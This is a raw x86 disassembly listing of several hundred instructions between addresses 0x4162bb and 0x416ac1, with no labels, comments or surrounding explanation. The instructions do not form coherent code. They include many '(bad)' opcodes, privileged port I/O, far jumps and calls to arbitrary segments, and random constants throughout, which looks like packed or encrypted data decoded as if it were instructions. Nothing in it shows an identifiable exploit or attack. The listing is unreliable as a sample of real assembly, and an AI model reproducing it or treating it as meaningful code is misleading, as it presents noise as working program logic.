  4162bb:	sbb    ah,BYTE PTR [ebp-0x10]
  4162be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162bf:	test   eax,0x54c7ab26
  4162c4:	inc    ebp
  4162c5:	popf   
  4162c6:	pop    es
  4162c7:	test   DWORD PTR [edx-0x4a],edi
  4162ca:	push   ss
  4162cb:	push   eax
  4162cc:	mov    cl,cl
  4162ce:	lods   al,BYTE PTR ds:[esi]
  4162cf:	add    BYTE PTR [edx],0xe2
  4162d2:	call   0x89cc19ed
  4162d7:	rcl    esp,1
  4162d9:	jo     0x4162f9
  4162db:	loop   0x4162ed
  4162dd:	fmul   QWORD PTR [ebx+0x6d]
  4162e0:	xchg   esi,eax
  4162e1:	inc    ebp
  4162e2:	(bad)  
  4162e3:	std    
  4162e4:	fwait
  4162e5:	push   esi
  4162e6:	inc    edi
  4162e7:	or     al,0x35
  4162e9:	jb     0x4162ea
  4162eb:	test   DWORD PTR [eax+0x17],ebp
  4162ee:	xchg   ebx,eax
  4162ef:	or     eax,0x4c1347da
  4162f4:	push   ds
  4162f5:	ins    DWORD PTR es:[edi],dx
  4162f6:	std    
  4162f7:	int    0x36
  4162f9:	in     al,dx
  4162fa:	jo     0x4162d0
  4162fc:	mov    cl,0x77
  4162fe:	add    eax,0xb0bcf2fc
  416303:	nop
  416304:	and    eax,0x3e227a25
  416309:	call   0x84f4:0xfc969989
  416310:	sbb    cl,BYTE PTR [edi-0x5c]
  416313:	leave  
  416314:	ffree  st(1)
  416316:	and    al,al
  416318:	test   eax,0xf28a9017
  41631d:	xor    eax,0xf3571839
  416322:	lods   eax,DWORD PTR ds:[esi]
  416323:	mov    ds:0xa81f0322,al
  416328:	cmp    edx,DWORD PTR [ebp+0x7f71b162]
  41632e:	adc    BYTE PTR [esi-0x69],cl
  416331:	jle    0x4163b0
  416333:	jo     0x416326
  416335:	and    ebx,esi
  416337:	das    
  416338:	inc    edi
  416339:	imul   eax,DWORD PTR [ebx],0x6a5a61a6
  41633f:	mov    ebp,0xf123163d
  416344:	outs   dx,DWORD PTR ds:[esi]
  416345:	push   ebp
  416346:	pop    edi
  416347:	mov    ss,WORD PTR [ebp+0x4bba50f1]
  41634d:	cmp    DWORD PTR ds:[edi-0x6a],0x4a
  416352:	out    dx,al
  416353:	cdq    
  416354:	adc    al,0xc5
  416356:	xor    bh,dh
  416358:	ret    
  416359:	mov    ch,0x8c
  41635b:	cmp    ch,BYTE PTR [ecx-0x67]
  41635e:	and    DWORD PTR [ebx],edi
  416360:	push   ss
  416361:	test   al,0x74
  416363:	inc    edx
  416364:	inc    esp
  416365:	dec    eax
  416366:	dec    eax
  416367:	xor    al,0x4d
  416369:	mov    ds:0xae5c1df2,al
  41636e:	xor    al,0xdb
  416370:	lds    ecx,FWORD PTR [ebp-0x38]
  416373:	pop    esi
  416374:	cmp    BYTE PTR [edi-0x554132c1],bh
  41637a:	jbe    0x4163ec
  41637c:	adc    ecx,ebx
  41637e:	add    ebx,DWORD PTR ds:0xd354b7ed
  416384:	add    bl,cl
  416386:	lea    edi,[ecx-0x1c]
  416389:	inc    esi
  41638a:	or     eax,0x6ee80b4e
  41638f:	lock pushf 
  416391:	or     esp,DWORD PTR [eax-0xd9c2a6f]
  416397:	mov    esi,0x7a802487
  41639c:	aad    0xfe
  41639e:	je     0x416331
  4163a0:	(bad)  
  4163a1:	sahf   
  4163a2:	pop    edi
  4163a3:	stos   BYTE PTR es:[edi],al
  4163a4:	push   0xea9c9fc9
  4163a9:	je     0x416386
  4163ab:	pusha  
  4163ac:	cmp    al,BYTE PTR [ecx+0x64]
  4163af:	push   cs
  4163b0:	inc    ecx
  4163b1:	das    
  4163b2:	mov    ds:0x2d716a46,eax
  4163b7:	mov    eax,ds:0x8679036
  4163bc:	enter  0xeda0,0x4a
  4163c0:	out    0x38,al
  4163c2:	adc    eax,0xbdf7b1e1
  4163c7:	mov    ds:0x9c48f2d5,eax
  4163cc:	mov    eax,0xc6dddae1
  4163d1:	sbb    ecx,ebx
  4163d3:	ins    BYTE PTR es:[edi],dx
  4163d4:	leave  
  4163d5:	jl     0x41644c
  4163d7:	mov    edi,0xb7e8b550
  4163dc:	(bad)  
  4163dd:	and    DWORD PTR [eax+0x65],esi
  4163e0:	jp     0x416415
  4163e2:	cmp    BYTE PTR [ebx*2+0x2de95795],0x71
  4163ea:	pop    es
  4163eb:	cld    
  4163ec:	dec    ecx
  4163ed:	add    BYTE PTR [edx],bl
  4163ef:	mov    edi,0x63bebafe
  4163f4:	mov    edi,0x7d2001ff
  4163f9:	dec    ebx
  4163fa:	xchg   esi,eax
  4163fb:	mov    bl,0x2a
  4163fd:	xchg   edx,eax
  4163fe:	sbb    DWORD PTR [esi+0x6c43cfd9],esi
  416404:	or     DWORD PTR [ebp-0x17],edi
  416407:	push   cs
  416408:	js     0x416390
  41640a:	push   es
  41640b:	and    esp,ebx
  41640d:	add    edi,DWORD PTR fs:[ebp-0x69550b9b]
  416414:	aam    0x98
  416416:	test   eax,0xebfb70f2
  41641b:	test   DWORD PTR [ecx],0x30a623d7
  416421:	das    
  416422:	cmp    DWORD PTR [eax+0x8],esp
  416425:	inc    esi
  416426:	neg    DWORD PTR [ebp-0x7b4c7a68]
  41642c:	mov    ebp,0xd6089397
  416431:	loope  0x4163d6
  416433:	add    eax,0x88e3dd94
  416438:	cwde   
  416439:	fst    DWORD PTR [ebp+0x77b094b7]
  41643f:	xor    eax,0xd1a7e2ae
  416444:	jmp    0x416408
  416446:	dec    ebp
  416447:	sub    ecx,DWORD PTR [ebp+0x73]
  41644a:	into   
  41644b:	mov    edi,0x4c733e5e
  416450:	popf   
  416451:	mov    esp,0x89154f37
  416456:	into   
  416457:	adc    al,0x11
  416459:	retf   0x4fdd
  41645c:	adc    BYTE PTR [edx+0x1e1eac36],ch
  416462:	call   0x5b44:0xce2ab36a
  416469:	xchg   edx,eax
  41646a:	push   esp
  41646b:	mov    al,0x16
  41646d:	ja     0x4164a3
  41646f:	ficom  DWORD PTR [eax+0x50f8632d]
  416475:	repz mov dl,0xeb
  416478:	inc    eax
  416479:	retf   
  41647a:	or     DWORD PTR [edx+0x54],0x1
  41647e:	and    bl,BYTE PTR [edx]
  416480:	lods   eax,DWORD PTR ds:[esi]
  416481:	add    bl,BYTE PTR [ebx-0x4b]
  416484:	call   0x306cfeb9
  416489:	cmp    al,0x48
  41648b:	adc    BYTE PTR [edi-0x58c0ab3d],0x6
  416492:	in     al,dx
  416493:	out    dx,al
  416494:	sahf   
  416495:	jbe    0x416428
  416497:	xchg   edx,eax
  416498:	mov    edi,0xa366ed2
  41649d:	gs jge 0x416476
  4164a0:	push   ebp
  4164a1:	jp     0x4164d5
  4164a3:	test   al,0xef
  4164a5:	push   es
  4164a6:	clc    
  4164a7:	mov    ds:0x4b7a0205,eax
  4164ac:	mov    ah,0xb
  4164ae:	pop    ss
  4164af:	cmc    
  4164b0:	loopne 0x4164d0
  4164b2:	inc    bp
  4164b4:	pop    edi
  4164b5:	test   DWORD PTR [esi],esi
  4164b7:	hlt    
  4164b8:	arpl   WORD PTR [edx],cx
  4164ba:	mov    eax,ds:0xec4b6967
  4164bf:	or     eax,0x31d46bac
  4164c4:	addr16 push es
  4164c6:	pushf  
  4164c7:	jle    0x41649d
  4164c9:	int3   
  4164ca:	xchg   DWORD PTR [esi+0x41],eax
  4164cd:	not    BYTE PTR [ebp+0x24]
  4164d0:	jo     0x41654d
  4164d2:	cdq    
  4164d3:	nop
  4164d4:	fidiv  WORD PTR [edi-0x29cb013b]
  4164da:	or     cl,BYTE PTR [eax+0x2c]
  4164dd:	popa   
  4164de:	or     dl,ch
  4164e0:	fcomp  st(1)
  4164e2:	mov    edi,0xee1d49a6
  4164e7:	loop   0x4164c5
  4164e9:	call   0x7f804cff
  4164ee:	push   ecx
  4164ef:	push   ds
  4164f0:	sub    ecx,DWORD PTR [ecx+0x67]
  4164f3:	inc    eax
  4164f4:	jmp    0x2c71:0x2799a57d
  4164fb:	mov    edx,0x38fa7917
  416500:	daa    
  416501:	mov    eax,0x9dc9e0ab
  416506:	jmp    0x416519
  416508:	(bad)  
  416509:	das    
  41650a:	push   0xf78865b2
  41650f:	test   eax,0x3377eeb7
  416514:	add    al,0xa
  416516:	mov    al,ds:0xba608841
  41651b:	mov    ?,WORD PTR [edx+0x35]
  41651e:	add    dl,BYTE PTR [edi+0x1]
  416521:	repz mov cs:0xff39e1f2,eax
  416528:	or     cl,BYTE PTR [edx+0x7d]
  41652b:	rcr    DWORD PTR [ebp-0x5b7df4cb],0xd3
  416532:	hlt    
  416533:	lahf   
  416534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416535:	mov    ds:0x8762991a,eax
  41653a:	out    0x86,al
  41653c:	mov    al,ds:0xaeeef8d
  416541:	sbb    BYTE PTR ds:0x979bc0cb,0xb7
  416548:	jnp    0x416536
  41654a:	lea    ebx,[edi-0x5917585e]
  416550:	lods   eax,DWORD PTR ds:[esi]
  416551:	add    BYTE PTR [esp+esi*1],dl
  416554:	sahf   
  416555:	ds (bad) 
  416557:	retf   
  416558:	aas    
  416559:	inc    edx
  41655a:	jb     0x4165ad
  41655c:	lds    ebp,FWORD PTR [edi]
  41655e:	jb     0x41656c
  416560:	jge    0x4164fa
  416562:	push   edx
  416563:	outs   dx,DWORD PTR ds:[esi]
  416564:	aas    
  416565:	data16 repnz cmp ah,al
  416569:	dec    esi
  41656a:	jle    0x416512
  41656c:	leave  
  41656d:	pop    ebp
  41656e:	ins    BYTE PTR es:[edi],dx
  41656f:	jl     0x4165a5
  416571:	js     0x416576
  416573:	xor    DWORD PTR [edi-0x586a759f],0xffffffba
  41657a:	inc    esp
  41657b:	cld    
  41657c:	and    eax,0xdabbff65
  416581:	or     eax,0x5b24e457
  416586:	nop
  416587:	sub    DWORD PTR [edx],0x4d725de4
  41658d:	inc    ch
  41658f:	repz pop es
  416591:	icebp  
  416592:	sti    
  416593:	fistp  WORD PTR [edi-0x52]
  416596:	xchg   BYTE PTR [edx+eiz*2-0x7a9fc19a],ah
  41659d:	pop    esi
  41659e:	adc    esi,DWORD PTR [ebp+0x33]
  4165a1:	mov    esi,0xfa55e896
  4165a6:	(bad)  
  4165a7:	mov    eax,ds:0xfa1be2d8
  4165ac:	pop    ebp
  4165ad:	mov    dl,0xd9
  4165af:	bound  ebp,QWORD PTR [ebx-0x7e]
  4165b2:	shl    ch,cl
  4165b4:	(bad)  
  4165b5:	sbb    ah,ah
  4165b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165b8:	jb     0x416628
  4165ba:	je     0x41659b
  4165bc:	(bad)  
  4165be:	mov    ds:0x5070eb4,eax
  4165c3:	out    0x2d,al
  4165c5:	sub    BYTE PTR [ebx+0x67],dl
  4165c8:	fnstsw WORD PTR [edi-0x5b4fad64]
  4165ce:	imul   edx,DWORD PTR [ebx],0xffffffcf
  4165d1:	test   BYTE PTR [edx],cl
  4165d3:	add    DWORD PTR [edi],edi
  4165d5:	mov    edi,0x909628b2
  4165da:	cli    
  4165db:	test   BYTE PTR [esi-0xe],dh
  4165de:	call   FWORD PTR [edi+edi*4+0x353b2823]
  4165e5:	mov    ah,0x50
  4165e7:	push   ebp
  4165e8:	in     al,dx
  4165e9:	cs and al,0x5b
  4165ec:	mov    ebx,?
  4165ee:	jmp    0x41660c
  4165f0:	arpl   WORD PTR [eax-0x5],cx
  4165f3:	das    
  4165f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165f5:	add    al,0x30
  4165f7:	push   ds
  4165f8:	sbb    bh,BYTE PTR [edx-0x26]
  4165fb:	mov    bl,BYTE PTR [edx+0x67]
  4165fe:	mov    edi,esp
  416600:	fst    QWORD PTR [esi+0x39c8aec8]
  416606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416607:	jge    0x416621
  416609:	push   ds
  41660a:	sti    
  41660b:	add    dl,BYTE PTR [edx-0x65b54c5c]
  416611:	fdiv   st(3),st
  416613:	(bad)  
  416615:	fs jecxz 0x4165b9
  416618:	ins    BYTE PTR es:[edi],dx
  416619:	xchg   ecx,eax
  41661a:	in     al,dx
  41661b:	outs   dx,BYTE PTR ds:[esi]
  41661c:	ja     0x416680
  41661e:	add    DWORD PTR [edx-0x17],ebp
  416621:	sbb    eax,0xc3e14b71
  416626:	xchg   edx,eax
  416627:	test   esp,esi
  416629:	lods   al,BYTE PTR ds:[esi]
  41662a:	in     eax,0x8
  41662c:	(bad)  
  41662d:	mov    ebp,0x81b9cefe
  416632:	or     ebx,eax
  416634:	cmp    eax,0x2b5b99a6
  416639:	sar    eax,1
  41663b:	int    0xf2
  41663d:	test   esi,esi
  41663f:	xchg   edx,eax
  416640:	mov    cl,0x4f
  416642:	fs pop ebp
  416644:	cmc    
  416645:	dec    ebp
  416646:	and    al,0x66
  416648:	jl     0x416637
  41664a:	(bad)  
  41664b:	adc    esp,eax
  41664d:	and    edi,DWORD PTR [edi]
  41664f:	popf   
  416650:	jmp    0x41660b
  416652:	loop   0x4165ec
  416654:	jbe    0x416622
  416656:	jbe    0x416655
  416658:	in     eax,0x37
  41665a:	cli    
  41665b:	fs aas 
  41665d:	mov    dh,0x44
  41665f:	(bad)  
  416660:	lahf   
  416661:	sub    BYTE PTR [edx-0x3a],dl
  416664:	inc    edx
  416665:	pop    ebx
  416666:	mov    ch,0xf1
  416668:	icebp  
  416669:	xor    dh,BYTE PTR [edx+0x29b449b9]
  41666f:	sub    BYTE PTR [ebx+0x1487f68f],ah
  416675:	or     eax,0x909ff495
  41667a:	in     al,0x2
  41667c:	push   ecx
  41667d:	stc    
  41667e:	sbb    DWORD PTR [ebx-0x578aa367],eax
  416684:	sub    BYTE PTR [ecx+0x22],bl
  416687:	pop    ds
  416688:	and    al,0xcd
  41668a:	xchg   BYTE PTR [esi+0x67],bh
  41668d:	mov    dh,0x17
  41668f:	push   ecx
  416690:	dec    ecx
  416691:	retf   
  416692:	lahf   
  416693:	cwde   
  416694:	js     0x41670e
  416696:	test   edx,0xaaed16e3
  41669c:	jg     0x41663e
  41669e:	jns    0x416690
  4166a0:	imul   ecx,DWORD PTR [eax],0xc3cf6752
  4166a6:	mov    dh,0x15
  4166a8:	mov    eax,0x38329406
  4166ad:	into   
  4166ae:	add    al,0xc3
  4166b0:	and    eax,0xe3dfd102
  4166b5:	sar    DWORD PTR [ecx-0x66],1
  4166b8:	scas   al,BYTE PTR es:[edi]
  4166b9:	jmp    0xb6a6:0xe9ebc719
  4166c0:	add    bl,bh
  4166c2:	lea    eax,[edi+0x2ac8c594]
  4166c8:	jns    0x41672f
  4166ca:	fisttp QWORD PTR [edi-0x72]
  4166cd:	out    dx,eax
  4166ce:	repz in al,dx
  4166d0:	push   esp
  4166d1:	call   0x6955e45e
  4166d6:	and    ecx,DWORD PTR [ebp-0x19]
  4166d9:	test   al,0x4a
  4166db:	dec    edx
  4166dc:	xchg   esp,eax
  4166dd:	(bad)  
  4166de:	sub    ah,dh
  4166e0:	push   eax
  4166e1:	xor    ch,BYTE PTR [esi+ebp*2]
  4166e4:	pop    esi
  4166e5:	ins    DWORD PTR es:[edi],dx
  4166e6:	push   esp
  4166e7:	mov    bh,0x84
  4166e9:	adc    BYTE PTR [edi-0x25],0x24
  4166ed:	jmp    0x4166c8
  4166ef:	scas   eax,DWORD PTR es:[edi]
  4166f0:	push   esp
  4166f1:	scas   al,BYTE PTR es:[edi]
  4166f2:	jg     0x41675d
  4166f4:	xchg   DWORD PTR [bp+di-0x38ed],ebp
  4166f9:	cli    
  4166fa:	mov    esi,0xa4df5580
  4166ff:	dec    ecx
  416700:	ins    DWORD PTR es:[edi],dx
  416701:	ja     0x4166b0
  416703:	leave  
  416704:	cmp    edi,edi
  416706:	mov    ah,0xc2
  416708:	pop    ecx
  416709:	repnz leave 
  41670b:	gs pop esi
  41670d:	and    al,0xb9
  41670f:	mov    ebx,0x8b7b18b1
  416714:	push   esi
  416715:	(bad)  
  416717:	sbb    DWORD PTR [ebp-0x40],ecx
  41671a:	popa   
  41671b:	sbb    al,0x7
  41671d:	push   ecx
  41671e:	inc    eax
  41671f:	mov    si,0xfa65
  416723:	push   esp
  416724:	sub    ebp,0x3e
  416727:	jbe    0x416782
  416729:	push   edi
  41672a:	ret    0xfb2f
  41672d:	cmp    BYTE PTR [ebp+0x48],bh
  416730:	mov    al,ds:0x99f306ac
  416735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416736:	(bad)  
  416737:	js     0x416785
  416739:	das    
  41673a:	fstp   QWORD PTR [eax-0x11d1b9c5]
  416740:	in     eax,dx
  416741:	mov    ch,BYTE PTR [esi]
  416743:	xchg   edi,eax
  416744:	mov    dl,0xfd
  416746:	loopne 0x4166f1
  416748:	push   ebp
  416749:	or     BYTE PTR ds:0x58f5052b,al
  41674f:	es pushf 
  416751:	das    
  416752:	pop    esi
  416753:	pop    edx
  416754:	sub    al,0xaf
  416756:	add    dl,cl
  416758:	add    BYTE PTR ds:0x745f216a,cl
  41675e:	outs   dx,DWORD PTR ds:[esi]
  41675f:	and    bh,al
  416761:	lock cmp edi,eax
  416764:	lds    esi,FWORD PTR [eax]
  416766:	sbb    eax,0xc6b54e0a
  41676b:	lods   eax,DWORD PTR ds:[esi]
  41676c:	mov    eax,0x3dbf1ac4
  416771:	mov    edx,edi
  416773:	call   0x51d7:0x908859e6
  41677a:	loope  0x416710
  41677c:	sahf   
  41677d:	fisub  WORD PTR [esi]
  41677f:	push   edi
  416780:	sub    al,0xd9
  416782:	add    dh,BYTE PTR [eax-0x5c2aa858]
  416788:	pop    es
  416789:	sub    BYTE PTR [eax+0x3c753a36],0x6c
  416790:	xlat   BYTE PTR ds:[ebx]
  416791:	call   0x30d6d52c
  416796:	cmp    DWORD PTR [eax+0x1a5289fa],esi
  41679c:	or     al,0x8e
  41679e:	mov    al,0xf7
  4167a0:	(bad)  
  4167a1:	sbb    eax,0xf005b667
  4167a6:	push   es
  4167a7:	and    ebp,DWORD PTR [ebp+ebx*2+0x41]
  4167ab:	(bad)  
  4167ac:	sub    ah,BYTE PTR [edi]
  4167ae:	(bad)  
  4167af:	push   edx
  4167b0:	xlat   BYTE PTR ds:[ebx]
  4167b1:	loopne 0x4167cc
  4167b3:	xor    al,0xc4
  4167b5:	pop    ds
  4167b6:	aas    
  4167b7:	jne    0x4167bc
  4167b9:	mov    ds:0xa0b639ae,eax
  4167be:	jo     0x416836
  4167c0:	pop    esp
  4167c1:	dec    edx
  4167c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167c3:	imul   ebx,DWORD PTR [ebx+0x19db5421],0x16430628
  4167cd:	retf   0xe9c8
  4167d0:	lods   al,BYTE PTR ds:[esi]
  4167d1:	aaa    
  4167d2:	adc    eax,0xbe51cd51
  4167d7:	cli    
  4167d8:	leave  
  4167d9:	mov    esp,0x41b26d91
  4167de:	mov    dh,0x4b
  4167e0:	jo     0x4167ff
  4167e2:	or     al,0x61
  4167e4:	repnz lods eax,DWORD PTR ds:[esi]
  4167e6:	push   edx
  4167e7:	int3   
  4167e8:	xchg   BYTE PTR [ebp-0x31],dh
  4167eb:	mov    ah,0xc3
  4167ed:	aad    0xdb
  4167ef:	push   esp
  4167f0:	xlat   BYTE PTR ds:[ebx]
  4167f1:	imul   esp,DWORD PTR [ecx+0x6e],0x5ec607d1
  4167f8:	pop    ebp
  4167f9:	mov    al,ds:0x10803b38
  4167fe:	xor    BYTE PTR [eax],dl
  416800:	daa    
  416801:	or     DWORD PTR [eax+esi*4-0x1bdd441c],edx
  416808:	jno    0x416811
  41680a:	push   ss
  41680b:	gs xchg ebx,eax
  41680d:	ret    
  41680e:	clc    
  41680f:	mov    esi,DWORD PTR [ebx+0x507ce67d]
  416815:	cmp    eax,0x167ee56f
  41681a:	shl    DWORD PTR [ecx+esi*2],0x76
  41681e:	jg     0x416802
  416820:	mov    dl,0xa3
  416822:	or     eax,0xd4f6bda9
  416827:	xchg   esi,eax
  416828:	test   al,0xa3
  41682a:	call   0xcfbc:0xb61d6e90
  416831:	jbe    0x4167c8
  416833:	xlat   BYTE PTR ds:[ebx]
  416834:	dec    edx
  416835:	dec    ebp
  416836:	xchg   ecx,eax
  416837:	leave  
  416838:	lods   al,BYTE PTR ds:[esi]
  416839:	or     al,0x5
  41683b:	fsubrp st(6),st
  41683d:	dec    esp
  41683e:	or     al,0x3b
  416840:	push   esi
  416841:	and    cl,ah
  416843:	js     0x4167d0
  416845:	inc    esi
  416846:	mov    ah,BYTE PTR [eax+0x61]
  416849:	sub    DWORD PTR [ebx-0x75c232d],edi
  41684f:	mov    ah,0x33
  416851:	jmp    0x416886
  416853:	and    ah,bl
  416855:	ror    BYTE PTR [edx],cl
  416857:	loope  0x4167e9
  416859:	pop    edi
  41685a:	pop    edi
  41685b:	jno    0x4168b6
  41685d:	scas   eax,DWORD PTR es:[edi]
  41685e:	xchg   BYTE PTR [eax+0x34637d11],cl
  416864:	mov    edx,eax
  416866:	adc    DWORD PTR [ebx-0x15957b4a],esp
  41686c:	sbb    al,0x9f
  41686e:	hlt    
  41686f:	loopne 0x41688b
  416871:	bound  ebx,QWORD PTR [edi-0x75d75473]
  416877:	push   es
  416878:	ds mov esp,0x6145d418
  41687e:	and    DWORD PTR [edx],esi
  416880:	stos   DWORD PTR es:[edi],eax
  416881:	add    dh,BYTE PTR ds:0xab9d
  416886:	fst    QWORD PTR [ecx]
  416888:	mov    cl,0xa2
  41688a:	retf   0x9bc
  41688d:	shl    BYTE PTR [edi+ebp*4-0x19],1
  416891:	jno    0x416897
  416893:	jp     0x416884
  416895:	pop    edx
  416896:	sahf   
  416897:	les    edi,FWORD PTR [ebx+0x4f531577]
  41689d:	inc    ebx
  41689e:	sbb    ah,BYTE PTR [esi-0x68dfa005]
  4168a4:	dec    ebx
  4168a5:	pop    ebx
  4168a6:	sub    bl,al
  4168a8:	sbb    al,BYTE PTR [edi+0xd]
  4168ab:	data16 and al,dh
  4168ae:	sbb    eax,0x13cc83ca
  4168b3:	repz xor al,0xe0
  4168b6:	pop    esp
  4168b7:	sub    al,0x7d
  4168b9:	add    bl,0x18
  4168bc:	pop    esp
  4168bd:	out    dx,eax
  4168be:	popf   
  4168bf:	ss imul esp,edx,0x2d
  4168c3:	pop    es
  4168c4:	loopne 0x41691b
  4168c6:	xlat   BYTE PTR fs:[ebx]
  4168c8:	es aaa 
  4168ca:	sub    BYTE PTR [edi+0x26ac732c],cl
  4168d0:	iret   
  4168d1:	or     al,0x28
  4168d3:	ror    ch,cl
  4168d5:	xchg   esi,eax
  4168d6:	jle    0x4168bc
  4168d8:	mov    edi,0x64757fd5
  4168dd:	out    0x49,eax
  4168df:	mov    esi,0x5a8ca7af
  4168e4:	outs   dx,DWORD PTR ds:[esi]
  4168e5:	jbe    0x4168e2
  4168e7:	lock cmp eax,0x4d3a3304
  4168ed:	and    DWORD PTR [edi-0x34],edi
  4168f0:	outs   dx,DWORD PTR ds:[esi]
  4168f1:	imul   BYTE PTR [edi+edi*2+0xa]
  4168f5:	mov    ah,0x45
  4168f7:	sbb    eax,0x19bc372c
  4168fc:	loop   0x416884
  4168fe:	mov    WORD PTR [eax+0x73d7986a],cs
  416904:	pusha  
  416905:	dec    esi
  416906:	mov    eax,ds:0xfb6df363
  41690b:	bound  ebp,QWORD PTR [eax+0x89f5a44]
  416911:	(bad)  
  416913:	pop    eax
  416914:	sbb    BYTE PTR [ebx+0x55],bh
  416917:	xor    bl,BYTE PTR ds:0x48c1ce1b
  41691d:	push   ds
  41691e:	jmp    0xd21e:0x889f3de7
  416925:	int3   
  416926:	jge    0x4168ca
  416928:	pop    es
  416929:	stos   DWORD PTR es:[edi],eax
  41692a:	mov    esi,0xa7296da
  41692f:	xor    ebx,DWORD PTR ss:[ecx-0x37f6f453]
  416936:	push   edx
  416937:	inc    ecx
  416938:	mul    ebx
  41693a:	cmp    dh,BYTE PTR [esp+ebx*8]
  41693d:	adc    al,0x41
  41693f:	in     eax,dx
  416940:	ffree  st(5)
  416942:	pushf  
  416943:	mov    esi,0x3ceb1645
  416948:	mov    ds:0x8410e8d2,al
  41694d:	xor    eax,0x53af78b5
  416952:	cmp    BYTE PTR [ebx],bh
  416954:	or     eax,DWORD PTR [ebp+0x32b29f17]
  41695a:	push   ds
  41695b:	jl     0x416961
  41695d:	push   edx
  41695e:	pop    ecx
  41695f:	add    DWORD PTR [ecx-0x12],ebp
  416962:	repnz add esp,DWORD PTR [eax-0x2cd36a39]
  416969:	lahf   
  41696a:	in     eax,dx
  41696b:	inc    edi
  41696c:	ss push 0x12
  41696f:	rcr    al,0x50
  416972:	lods   al,BYTE PTR ds:[esi]
  416973:	xchg   esp,eax
  416974:	ins    DWORD PTR es:[edi],dx
  416975:	cmc    
  416976:	out    0x2d,al
  416978:	test   eax,0x667f5339
  41697d:	xor    bh,ch
  41697f:	mov    cs,WORD PTR [ebx]
  416981:	mov    cl,0x45
  416983:	fidiv  WORD PTR [ebx+0xd]
  416986:	rcl    DWORD PTR ds:0x3b336f9,0x28
  41698d:	inc    edx
  41698e:	pop    ss
  41698f:	or     BYTE PTR [edx+0x52834f2],cl
  416995:	xchg   BYTE PTR [esi+0x6e],bh
  416998:	into   
  416999:	mov    ebp,0xfcfd5b0
  41699e:	inc    ecx
  41699f:	and    eax,DWORD PTR [ebx+0x600e47b5]
  4169a5:	mov    ds:0x88a7dc96,eax
  4169aa:	aas    
  4169ab:	mov    ch,BYTE PTR [esi]
  4169ad:	out    dx,al
  4169ae:	jno    0x4169bd
  4169b0:	pop    ebx
  4169b1:	push   edi
  4169b3:	fild   DWORD PTR [eax+0x30]
  4169b6:	dec    edx
  4169b7:	mov    ah,0x5a
  4169b9:	shr    DWORD PTR [edi-0x4f],1
  4169bc:	sbb    ebx,0x35
  4169bf:	les    edx,FWORD PTR [eax+0x7d908582]
  4169c5:	test   BYTE PTR ds:0xe3ac0bca,cl
  4169cb:	(bad)  
  4169cd:	cmp    edx,DWORD PTR [ebx+0x32788b0a]
  4169d3:	enter  0x2cf9,0x6d
  4169d7:	and    DWORD PTR [eax+0x2ea406bd],ecx
  4169dd:	test   DWORD PTR [edx+edx*1],edx
  4169e0:	pusha  
  4169e1:	popf   
  4169e2:	loop   0x416a0d
  4169e4:	callw  0x188b
  4169e8:	ins    DWORD PTR es:[edi],dx
  4169e9:	inc    edi
  4169ea:	push   ebp
  4169eb:	pop    es
  4169ec:	call   0x7a97:0xe958d95e
  4169f3:	push   eax
  4169f4:	stos   BYTE PTR es:[edi],al
  4169f5:	mov    bh,0x2
  4169f7:	cmc    
  4169f8:	adc    al,0xa4
  4169fa:	repnz retf 
  4169fc:	imul   ebp,DWORD PTR [ebp-0x63fda5eb],0x2f
  416a03:	shl    DWORD PTR [eax-0x1c],0x2
  416a07:	into   
  416a08:	mov    esi,0x9e974144
  416a0d:	inc    ebp
  416a0e:	dec    edi
  416a0f:	outs   dx,DWORD PTR ds:[esi]
  416a10:	jge    0x416a73
  416a12:	es data16 jecxz 0x4169bb
  416a16:	and    al,0xf4
  416a18:	mov    esp,0xa8befd5
  416a1d:	jno    0x416a91
  416a1f:	addr16 push ebx
  416a21:	(bad)  
  416a22:	aaa    
  416a23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a24:	rol    BYTE PTR [ebx+eiz*4],1
  416a27:	ja     0x416a35
  416a29:	adc    BYTE PTR [ebx-0x33bf0313],cl
  416a2f:	or     ecx,edi
  416a31:	test   DWORD PTR [esi-0x36],ecx
  416a34:	push   ecx
  416a35:	aas    
  416a36:	mov    ah,0x8a
  416a38:	fdivr  QWORD PTR [edi]
  416a3a:	loopne 0x416a80
  416a3c:	push   ds
  416a3d:	or     eax,0x8f158b74
  416a42:	aad    0x89
  416a44:	inc    ebx
  416a45:	inc    esi
  416a46:	mov    edi,0x792ef36a
  416a4b:	out    0x9c,al
  416a4d:	ins    DWORD PTR es:[edi],dx
  416a4e:	adc    BYTE PTR [esi+ecx*1+0x28],ch
  416a52:	mov    bl,0xc5
  416a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a55:	jmp    0xd65:0x4c553b97
  416a5c:	xchg   DWORD PTR [edx-0x38d7edb2],esi
  416a62:	inc    edi
  416a63:	sbb    DWORD PTR [ebx],edi
  416a65:	mov    ch,0x96
  416a67:	(bad)
  416a6a:	adc    eax,0xe5be37e
  416a6f:	sar    DWORD PTR [eax+ebx*4-0x71a9d58f],1
  416a76:	scas   al,BYTE PTR es:[edi]
  416a77:	inc    esp
  416a78:	sbb    al,0xb
  416a7a:	mov    dh,cl
  416a7c:	shl    BYTE PTR ds:0xa8b642e8,cl
  416a82:	mov    dl,0x23
  416a84:	sbb    dl,BYTE PTR [eax+edi*2]
  416a87:	mov    ds,ebp
  416a89:	fwait
  416a8a:	rol    BYTE PTR [esi+ebx*2],1
  416a8d:	xor    BYTE PTR [ebp-0x4d],0x7f
  416a91:	push   ss
  416a92:	inc    edi
  416a93:	and    eax,0xea3636bd
  416a98:	gs pop ebx
  416a9a:	sub    esi,DWORD PTR [edx-0x2b42e735]
  416aa0:	imul   esp,esp,0x9a965a12
  416aa6:	push   eax
  416aa7:	xchg   ebp,eax
  416aa8:	ret    
  416aa9:	inc    eax
  416aaa:	out    0x9f,al
  416aac:	add    DWORD PTR [edi],edx
  416aae:	fmul   DWORD PTR [edi-0x57]
  416ab1:	mov    ch,0x3f
  416ab3:	mov    eax,ds:0xcebe33e2
  416ab8:	inc    edx
  416ab9:	jge    0x416aac
  416abb:	or     dl,BYTE PTR [ebx+0x4e729c17]
  416ac1:	test   al,0xd2
